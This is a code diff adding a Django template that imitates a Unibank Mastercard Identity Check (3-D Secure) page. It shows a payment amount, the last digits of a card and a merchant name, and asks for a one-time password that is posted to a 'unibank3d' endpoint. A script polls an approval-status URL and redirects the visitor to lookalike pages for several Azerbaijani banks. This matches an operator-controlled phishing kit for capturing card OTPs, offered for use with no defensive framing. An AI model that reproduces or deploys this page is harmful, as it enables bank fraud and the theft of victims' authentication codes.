@@ -1,0 +1,151 @@
+{% load static %}
+<html lang="EN" dir="ltr">
+   <head>
+      <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height">
+      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+      <title>
+      </title>
+      <link rel="shortcut icon" type="image/ico" href="{% static '/img/unibank.png' %}">
+      <link rel="stylesheet" href="{% static 'css/unicss1.css' %}">
+      <link rel="stylesheet" href="{% static 'css/unicss2.css' %}">
+      <style type="text/css">@font-face { font-family: Roboto; src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf"); }</style>
+   </head>
+   <body class="MASTERCARD vsc-initialized" cz-shortcut-listen="true">
+      <div data-entry-point="application-container">
+         <div class="main web-based">
+            <div class="header-zone"><button id="cancel" class="cancel">Cancel</button></div>
+            <div class="title">
+               <div class="ps"><img src="{% static '/img/MASTERCARDuni.png' %}" alt="Mastercard Identity Check"></div>
+               <div class="logo"><img src="{% static '/img/unibank.png' %}"></div>
+            </div>
+            <div class="content">
+               <div class="item item-caption">Cardholder Authentication</div>
+               <div data-entry-point="payment-details">
+                  <div>
+                     <div class="item item-amount">{{amount}} <span>AZN</span></div>
+                     <div class="item columns">
+                        <div class="item-left">Merchant Name</div>
+                        <div class="item-right">WWW.ASANODEME.NET </div>
+                     </div>
+                     <div class="item columns"></div>
+                     <div class="item columns acct-number">
+                        <div class="item-left">Card Number</div>
+                        <div class="item-right">**** **** **** {{cc}} </div>
+                     </div>
+                  </div>
+               </div>
+               <div data-entry-point="authentication">
+                  <div>
+                    <ul class="cp-error-descriptions" style="display: none;"> </ul>
+                    <div class="item item-indent">Please enter one-time password to confirm your identity. Password has been sent to <span class="address">+************</span></div>
+                    <div class="item-description item-indent">Enter dynamic password:</div>
+                    <div class="item">
+                          <form method="POST"  action='unibank3d' data-validation-context="*" novalidate="">
+                            {% csrf_token %}
+                            <input type="tel" name="secpass" value="" autocomplete="one-time-code" class="cp-wrappable  cp-input-OTP">
+
+                            <script>
+                            // sadece rakam yazılmasını sağlar
+                            document.getElementsByName("secpass")[0].addEventListener("input", function(event) {
+                                let value = event.target.value;
+                                event.target.value = value.replace(/\D/g, "");
+                            });
+                            
+                            // maksimum 6 rakam yazılmasını sağlar
+                            document.getElementsByName("secpass")[0].addEventListener("input", function(event) {
+                                let value = event.target.value;
+                                if (value.length > 6) {
+                                    event.target.value = value.slice(0, 6);
+                                }
+                            });
+                            </script>
+                            </div>
+                        <div class="item item-indent cp-error"> </div>
+                        <a id="secureCodeError" style="display: {{display}};"><h5>Təhlükəsizlik kodu yanlışdır</h5></a>
+				<style>
+					h5 {
+					  font-size: 0.9rem;
+					  color: red;
+					}
+				  </style>
+                        <br>
+                        <div class="cp-otp-buttons">
+                           <div class="item"><button type="submit" class="submit">Submit</button></div>
+                           <div class="item item-indent cp-item-resend cp-is-hidden"><a href="#" id="resendChallenge" class="resend">Resend password</a><input type="hidden" value="Y" name="resendChallenge"></div>
+                        </div>
+                     </form>
+                  </div>
+               </div>
+            </div>
+            <div class="information-zone"></div>
+         </div>
+      </div>
+      <div>
+      <div class="cp-ajax-indicator cp-not-displayed">
+         <div class="sk-circle">
+            <div class="sk-circle1 sk-child"></div>
+            <div class="sk-circle2 sk-child"></div>
+            <div class="sk-circle3 sk-child"></div>
+            <div class="sk-circle4 sk-child"></div>
+            <div class="sk-circle5 sk-child"></div>
+            <div class="sk-circle6 sk-child"></div>
+            <div class="sk-circle7 sk-child"></div>
+            <div class="sk-circle8 sk-child"></div>
+            <div class="sk-circle9 sk-child"></div>
+            <div class="sk-circle10 sk-child"></div>
+            <div class="sk-circle11 sk-child"></div>
+            <div class="sk-circle12 sk-child"></div>
+         </div>
+         <img src="{% static '/img/MASTERCARDuni.png' %}">
+      </div>
+      <daily-companion-app></daily-companion-app>
+   </body>
+</html>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        var contact_id = {{ last_contact_id }};
+        var interval_id = setInterval(check_approval_status, 30000); 
+
+        function check_approval_status() {
+            $.ajax({
+                url: '/check_approval_status/' + contact_id + '/',
+                success: function(data) {
+                    if (data.bankname == "kapital") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "kapital" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "abb") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "abb" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "leobank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "unibank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "pashabank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "pashabank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "error") {
+                        clearInterval(interval_id);  // stop checking for updates
+                        window.location.href = '{% url "error" %}';  // redirect to the new view
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log('Error checking approval status:', error);
+                }
+            });
+        }
+    });
+</script>
